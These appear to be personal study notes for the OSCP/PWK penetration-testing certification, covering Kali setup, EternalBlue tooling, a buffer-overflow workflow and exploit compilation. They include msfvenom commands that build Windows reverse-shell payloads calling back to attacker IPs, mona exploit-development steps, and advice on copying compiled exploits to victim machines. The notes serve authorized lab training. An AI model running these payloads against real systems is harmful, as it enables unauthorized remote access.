### Setting up your box
```bash
You have to use Kali Linux in the PWK and OSCP. You can download the .iso file or use the emailed VMware specific file.
I have done both and they both work just fine.

They say that it is because of the touchiness of the Buffer Overflow exploit in the OSCP test.
I've done it, and it's pretty straight forward and is nothing to worry about. NO issues with a standard updated .iso image.

Get your .iso of your choice (When upgrading, your terminal links will break. Here is the fix)
    1  sudo apt update -y && sudo apt upgrade -y
    2  sudo apt autoremove
    3  sudo apt update && sudo apt upgrade
    4  sudo apt-get install xfce4-helpers

sudo apt install python3-pip
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .

You will need a GUI text editor for buffer overflows. I use gedit
sudo apt install gedit
filezilla comes in handy just make sure to check the box that allows you to see hidden files.
  1. When dealing with ftp make sure you switch to binary mode
  2. If it hangs, try passive mode.

Empire is great for pivoting (Even though you wont be doing it much in the labs)
sudo apt-get install powershell-empire
```
### Exercises for 5 bonus points
```bash
If you do all of the required exercises you get 5 bonus points for the test. Is it worth it? Probably not.
I did it, because I wanted to get everything out of the PWK. It took me about 150-170 hours and about 200 pages of report.
Most of the stuff you will be doing is not related to the test much. So... Yes its good to learn, but do what you will.
You will also need to write 10 reports on the lab machines. I think this is a great way to take notes and I basically did for my 
40+ roots.
I have run into corruptions with cherrytree I do not recommend. 
Cool kids run joplin
I just copied my screen shots and took all my notes in word, and uploaded to the cloud. I found that to be the safest and easiest.
All my notes are on github, and I have some private notes that have sensitive answers. 
```
### Eternal Blue
```bash
You will be challenged to run most things without metasploit. Setting up eternal blue and samba cry was easiest for me on a separate python 2 only box.
python2 is a bit tricky to set up because it has been discontinued. However this will work smooth.
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python get-pip.py

git clone https://github.com/SecureAuthCorp/impacket.git
pip install --upgrade setuptools
pip install impacket
git clone https://github.com/worawit/MS17-010.git
```

### Buffer overflow woes
```bash
When the time comes to learn BO just stick to the commands below. It is easy to overcomplicate things. 
Doing this you can easily finish the BO on the test in 30-60 minutes.

PWK does an absolute horrible job teaching BO. Therefore pay 10 bucks to use tryhackme.com for a month and
it is much easier to learn.
https://tryhackme.com/room/bufferoverflowprep
If anyone needs help, I can walk you through it in an hour and you will be G2G.

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
!mona config -set workingfolder c:\mona\bruiser
!mona findmsp -distance 600
!mona bytearray -b "\x00"
!mona compare -f C:\mona\bruiser\bytearray.bin -a esp
!mona jmp -r esp -cpb "\x00"


MATCH YOUR PAYLOAD LANGUAGE WITH THE LANGUAGE OF THE PROGRAM RUNNING (WINDOWS IS PROBABLY RUNNING C) OR Python (hint)
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.41.12 LPORT=4444 EXITFUNC=thread -b "\x00" -f py

BAD CHARS 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
##### GCC
```bash
You will often need to compile an exploit and many times GCC will not be on the victim box. You can download the libraries to do so but
I got SO SICK OF THE ERRORS trying to compile for x86 on x64 that I just downloaded separate VM's such as centos and ubuntu 11 to compile on
then wget them over to the victim. SO MUCH EASIER this way.
But if you want to test your luck here is the basics on Kali
sudo apt install default-libmysqlclient-dev default-libmysqld-dev
After you've finished compiling, run "file <compiled file name>". Is the file shown as a 32 bit or 64 bit binary? If it's still 64 bit even after using the -m32 flag you can try "sudo apt install gcc-multilib". Then run gcc -m32 -Wl,--hash-style=both -o outputfile inputfile.c 

Just take 15 minutes and make a compiling VM.
UBUNTU
sudo nano /etc/apt/sources.list
replace all the current us >>> old-releases
  example deb http://old-releases.ubuntu.com/ubuntu/
sudo apt-get update
sudo apt-get install gcc
*I installed some extra stuff*
sudo apt-get install libsctp-dev
```
